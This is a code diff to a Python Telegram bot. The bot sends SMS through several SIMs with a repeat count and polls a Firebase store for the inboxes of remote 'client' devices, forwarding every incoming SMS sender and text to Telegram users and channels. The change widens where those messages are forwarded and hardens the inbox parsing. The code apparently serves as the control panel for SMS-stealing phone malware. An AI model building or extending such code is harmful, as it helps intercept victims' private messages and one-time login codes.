@@ -725,8 +725,12 @@ async def _forward_text(bot:Bot, targets:list, text:str):
             return False
 
     if targets:
-        await asyncio.gather(*(_send(target) for target in dict.fromkeys(targets)),
-                             return_exceptions=True)
+        results=await asyncio.gather(
+            *(_send(target) for target in dict.fromkeys(targets)),
+            return_exceptions=True,
+        )
+        return sum(result is True for result in results)
+    return 0
 
 
 async def _do_send(bot:Bot, uid:int, to:str, text:str):
@@ -753,12 +757,15 @@ async def _do_send(bot:Bot, uid:int, to:str, text:str):
         f"  📶 SIMs    : <code>{len(sims)}  🔁 x{rpt}</code>"
     )
 
-    # User notification and forwarding run together; forwarding is not blocked
-    # by a slow or unavailable target.
+    # User notification and forwarding run together. The active channel is
+    # also a destination; previously only manually-added `fwd` targets got it.
     d2=load(); u2=usr(uid,d2)
+    targets=list(u2.get("fwd",[]))
+    if u2.get("active",{}).get("ch_id") not in (None, "", 0, "0"):
+        targets.append(u2["active"]["ch_id"])
     await asyncio.gather(
         bot.send_message(uid,result,parse_mode="HTML"),
-        _forward_text(bot,u2.get("fwd",[]),result),
+        _forward_text(bot,targets,result),
         return_exceptions=True,
     )
 
@@ -783,21 +790,33 @@ async def monitor_worker(bot:Bot, uid:int):
         try:
             await asyncio.sleep(4)
             inbox=await fb_get(fb,f"/clients/{dev}/inbox.json",api_key)
-            for mid,mdata in (inbox or {}).items():
+            if isinstance(inbox,list):
+                inbox={str(i):v for i,v in enumerate(inbox)}
+            if not isinstance(inbox,dict): inbox={}
+            for mid,mdata in inbox.items():
                 if mid in _seen[uid]: continue
+                if not isinstance(mdata,dict):
+                    _seen[uid].add(mid); continue
+                sender=(mdata.get("from") or mdata.get("sender") or
+                         mdata.get("phone") or mdata.get("address") or "?")
+                content=(mdata.get("message") or mdata.get("body") or
+                         mdata.get("text") or mdata.get("content") or "")
+                if not content:
+                    _seen[uid].add(mid)
+                    continue
                 _seen[uid].add(mid)
                 if len(_seen[uid])>500: _seen[uid]=set(list(_seen[uid])[-200:])
-                sender=mdata.get("from") or mdata.get("sender","?")
-                content=mdata.get("message") or mdata.get("body","")
-                if not content: continue
                 note=(f"📨 <b>Incoming SMS</b>\n\n"
                       f"  📞 From    : <code>{sender}</code>\n"
                       f"  💬 Message : <code>{content}</code>\n"
                       f"  🕐 Time    : <code>{datetime.now().strftime('%H:%M:%S')}</code>")
-                d2=load()
+                d2=load(); u2=usr(uid,d2)
+                targets=list(u2.get("fwd",[]))
+                if u2.get("active",{}).get("ch_id") not in (None, "", 0, "0"):
+                    targets.append(u2["active"]["ch_id"])
                 await asyncio.gather(
                     bot.send_message(uid,note,parse_mode="HTML"),
-                    _forward_text(bot,usr(uid,d2).get("fwd",[]),note),
+                    _forward_text(bot,targets,note),
                     return_exceptions=True,
                 )
         except asyncio.CancelledError:
